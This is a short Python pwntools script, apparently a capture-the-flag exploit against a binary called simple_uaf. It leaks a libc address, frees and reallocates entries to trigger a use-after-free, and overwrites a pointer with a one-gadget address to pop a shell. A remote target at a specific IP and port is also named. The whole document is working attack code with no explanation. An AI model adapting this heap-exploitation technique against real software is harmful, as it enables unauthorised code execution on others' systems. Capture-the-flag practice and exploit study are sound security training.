from pwn import *

def add(name, age):
  p.sendlineafter("> ", "1")
  p.sendlineafter(": ", name)
  p.sendlineafter(": ", str(age))

def modify(idx, name, age):
  p.sendlineafter(">", "2")
  p.sendlineafter(": ", str(idx))
  p.sendlineafter(": ", name)
  p.sendlineafter(": ", str(age))

def delete(idx):
  p.sendlineafter("> ", "3")
  p.sendlineafter(": ", str(idx))

p=remote("20.194.60.101", 7714)
p=process("./simple_uaf")
e=ELF("./simple_uaf")
l=e.libc

p.recvuntil("0x")
libc_base=int(p.recv(12), 16)+0x4F440-l.sym['system']

pause()

delete(2)

pause()

delete(3)

pause()

add("A"*0x30, 2)

modify(0, "A"*0x18+p64(libc_base+0x4f432),1)

p.interactive()